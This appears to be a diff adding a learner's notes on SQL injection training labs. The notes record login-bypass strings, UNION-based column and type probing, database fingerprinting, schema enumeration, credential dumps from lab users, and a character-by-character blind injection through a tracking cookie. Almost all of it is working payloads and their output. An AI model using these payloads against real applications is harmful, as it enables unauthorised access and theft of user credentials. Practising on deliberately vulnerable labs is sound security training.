@@ -1,0 +1,258 @@
+lab 1
+
+
+SELECT * FROM products WHERE catergory = 'Gifts' AND released = 1
+
+SELECT * FROM products WHERE catergory = '' OR 1=1--' AND released = 1
+
+lab 2
+
+login function
+
+administrator'--  -> 302 response
+
+' OR 1=1--  -> 302 response
+
+lab 3
+
+' ORDER BY 3--  -> 200 response
+
+' ORDER BY 4-- -> error
+
+the number of columns is 3
+
+' UNION SELECT NULL, NULL, NULL--
+
+lab 4
+
+' ORDER BY 3--  -> 200 response
+
+' ORDER BY 4-- -> error
+
+the number of columns is 3
+
+' UNION SELECT NULL, 'a', NULL--  -> 200 response
+
+column 2 -> string data type
+
+retrieve the string 'FaRVf1'
+
+' UNION SELECT NULL, 'FaRVf1', NULL--
+
+lab 5
+
+' ORDER BY 2--  -> 200 response
+
+' ORDER BY 3-- -> error
+
+the number of columns is 2
+
+' UNION SELECT 'a', NULL--  -> 200 response
+
+' UNION SELECT 'a', 'a'--  -> 200 response
+
+Both columns are string data type
+
+' UNION SELECT username, password FROM users--
+
+Username: administrator
+Password: 9op1hzose5r2nj9cdb01
+
+lab 6
+
+' ORDER BY 2--  -> 200 response
+
+' ORDER BY 3--  -> error
+
+the number of columns is 2
+
+' UNION SELECT 'a', NULL--  -> error
+
+' UNION SELECT NULL, 'a'--  -> 200 response
+
+Only the second column accept string data type
+
+' UNION SELECT NULL, version()--
+PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1)
+
+' UNION SELECT NULL, username || password FROM USERS--
+administratoruvq2bc1usbm8yo725tzz
+
+' UNION SELECT NULL, username || ' : ' || password FROM USERS--
+administrator : uvq2bc1usbm8yo725tzz
+wiener : 25pq4se1wokxachqbva3
+carlos : 5pbf0e5afv2zuwvh3hlo
+
+lab 6 
+
+' ORDER BY 2--  -> 200 response
+' ORDER BY 2--  -> error
+
+the number of columns is 2
+
+' UNION SELECT banner, NULL FROM v$version--
+
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+lab 7
+
+' ORDER BY 2--  -> error
+' ORDER BY 2#  -> 200 response
+' ORDER BY 3# -> error
+# = %23
+
+the number of columns is 2
+
+' UNION SELECT banner, NULL FROM v$version#  -> error -> not oracle database
+
+' UNION SELECT @@version, NULL#  -> 200 response -> Microsoft or MySQL database
+version 8.0.29
+
+lab 8
+
+' ORDER BY 2--  -> 200 response
+' ORDER BY 3--  -> error
+
+the number of columns is 2
+
+' UNION SELECT @@version, NULL--  -> error -> not Microsoft nor MySQL database
+' UNION SELECT version(), NULL--  -> 200 response
+-> PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1)
+
+' UNION SELECT 'a', NULL--  -> 200 response
+' UNION SELECT 'a', 'a'--  -> 200 response
+
+Both columns accept string data type
+
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+search for users table only one match
+
+Users table: users_jrqqry
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_jrqqry'--
+
+columns:
+username_sguoau
+password_ichklo
+
+' UNION SELECT username_sguoau, password_ichklo FROM users_jrqqry--  -> 200 response
+
+carlos
+	xawcjufmshg5bmgqltpx
+administrator
+	xu587brf34oc18441uq0
+wiener
+	i9c2unu1akdcd8qwaj0h
+
+Login as the administrator user
+
+lab 9
+
+' ORDER BY 2--  -> 200 response
+' ORDER BY 3--  -> Internal Server Error
+
+the number of columns is 2
+
+' UNION SELECT NULL, NULL--  -> error
+
+' UNION SELECT NULL, NULL FROM DUAL--  -> 200 response
+-> Oracle database
+
+' UNION SELECT 'a', NULL FROM DUAL--  -> 200 response
+' UNION SELECT 'a', 'a' FROM DUAL--  -> 200 response
+
+Both columns accept string data type
+
+' UNION SELECT table_name, NULL FROM all_tables--  -> 200 response
+
+users talbe: USERS_GFLKWG
+
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_GFLKWG'--
+
+columns:
+USERNAME_MEQCCS
+PASSWORD_AHSILC
+
+' UNION SELECT USERNAME_MEQCCS, PASSWORD_AHSILC FROM USERS_GFLKWG--  -> 200 response
+
+administrator
+	08mgr5oqlnz5r5c27zar
+carlos
+	r4bu1gvlofh8ytbcco57
+wiener
+	s0gkpu08xa1iml3w8p3r
+
+Login as the administrator user
+
+lab 10
+
+Request -> GET / HTTP/1.1
+Cookie: TrackingId=EdznPfGlhOWjFHsG; session=19jeYOr5Bgmnr0BHOSDupeJuqUYsWBNm
+
+
+TrackingId=EdznPfGlhOWjFHsG'+AND+1=1--  -> Welcome back 
+TrackingId=EdznPfGlhOWjFHsG'+AND+1!=1--  -> no Welcome back
+
+' AND (SELECT 'X' FROM users LIMIT 1) = 'X'--  -> Welcome back 
+' AND (SELECT 'X' FROM users LIMIT 1) = 'a'--  -> no welcome back
+
+Users table exist
+
+' AND (SELECT username FROM users WHERE username = 'administrator') = 'administrator'--
+-> Welcome back
+
+User administrator exist
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) = 'administrator'--  -> welcome back
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 19) = 'administrator'--  -> welcome back
+
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 20) = 'administrator'--  -> no welcome back
+
+the length of the administrator password is 20
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) = 's') = 'administrator'--  -> welcome back 
+
+keep dowing this until you find all the characters in the password
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 2, 1) = 'g') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 3, 1) = 'q') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 4, 1) = '0') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 5, 1) = 'b') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 6, 1) = '7') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 7, 1) = 'q') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 8, 1) = 'k') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 9, 1) = 'n') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 10, 1) = 'o') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 11, 1) = 'm') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 12, 1) = 'c') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 13, 1) = 'l') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 14, 1) = 's') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 15, 1) = 'y') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 16, 1) = 'e') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 17, 1) = 'c') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 18, 1) = '4') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 19, 1) = '7') = 'administrator'--  -> welcome back 
+
+' AND (SELECT username FROM users WHERE username = 'administrator' AND SUBSTRING(password, 20, 1) = 'h') = 'administrator'--  -> welcome back 
+
+Username: administrator
+Password: sgq0b7qknomclsyec47h
